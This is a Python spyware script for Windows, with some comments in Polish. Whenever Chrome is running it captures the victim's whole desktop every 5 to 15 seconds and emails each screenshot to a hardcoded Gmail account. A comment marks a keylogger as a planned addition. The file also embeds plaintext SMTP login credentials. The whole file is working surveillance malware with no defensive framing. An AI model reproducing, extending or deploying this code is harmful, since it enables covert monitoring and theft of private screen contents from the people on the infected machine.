import base64
from time import sleep
import win32api
import win32con
import win32gui
import win32ui
# from threading import Timer
from datetime import datetime
import random
import smtplib
import imghdr
from email.message import EmailMessage
#dobuwać keyloogera
import subprocess


time_interval = random.randint(5, 15)
smpt_server = 'smtp.gmail.com'
smtp_port = 465
smtp_acct = 'becyp2137@gmail.com'
smtp_password = 'SlavaUkrainie69'
tgt_accts = ['becyp2137@gmail.com', 'becyp69@op.pl'] # ta lista może być zmienna
now = datetime.now() # current date and time

# getting the size of screen, a victim can have multiple monito
# ther is sth wrong 
def get_dimensions():
    width = win32api.GetSystemMetrics(win32con.SM_CXVIRTUALSCREEN)
    height = win32api.GetSystemMetrics(win32con.SM_CYVIRTUALSCREEN)
    left = win32api.GetSystemMetrics(win32con.SM_XVIRTUALSCREEN)
    top = win32api.GetSystemMetrics(win32con.SM_YVIRTUALSCREEN)
    return (width, height, left, top)
   

def screenshot( name = 'screenshot'):
    # making handle for desktop
    hdesktop = win32gui.GetDesktopWindow() 
    width, height, left, top = get_dimensions()

    desktop_dc = win32gui.GetWindowDC(hdesktop)
    img_dc = win32ui.CreateDCFromHandle(desktop_dc)
    mem_dc = img_dc.CreateCompatibleDC()

    # saveing screenshot as a bitmap
    screenshot = win32ui.CreateBitmap()
    screenshot.CreateCompatibleBitmap(img_dc, width, height)
    mem_dc.SelectObject(screenshot)
    mem_dc.BitBlt((0,0), (width, height), img_dc, (left, top), win32con.SRCCOPY)
    name += '.bmp'
    screenshot.SaveBitmapFile(mem_dc, name)

    mem_dc.DeleteDC()
    win32gui.DeleteObject(screenshot.GetHandle())


def screenshot_email(subject, contents):
    mailobj = smtplib.SMTP('smtp.gmail.com',587)
    mailobj.ehlo()
    mailobj.starttls()
    mailobj.login('becyp2137@gmail.com','SlavaUkrainie69')
    msg = EmailMessage()
    msg['Subject'] = subject
    msg['From'] = smtp_acct
    msg['To'] = smtp_acct # i can not work change to email
    msg.set_content(contents)

    screenshot()

    with open('screenshot.bmp', 'rb') as f:
        file_data = f.read()
        file_type = imghdr.what(f.name)
        file_name = f.name
    
    msg.add_attachment(file_data, maintype='image', subtype = file_type, filename=file_name)
    mailobj.send_message(msg)
    mailobj.quit()

def process_exists(process_name = "chrome.exe"):
    call = 'TASKLIST', '/FI', 'imagename eq %s' % process_name
    # use buildin check_output right away
    output = subprocess.check_output(call).decode()
    # check in last line for process name
    last_line = output.strip().split('\r\n')[-1]
    # because Fail message could be translated
    return last_line.lower().startswith(process_name.lower())

if __name__ == '__main__':
    while True:
        now = datetime.now() # current date and time
        date_time = now.strftime("%m/%d/%Y, %H:%M:%S")
        if(process_exists('chrome.exe')):
            screenshot_email(date_time, date_time)
            print(f"message send: {now}")
        sleep(time_interval)


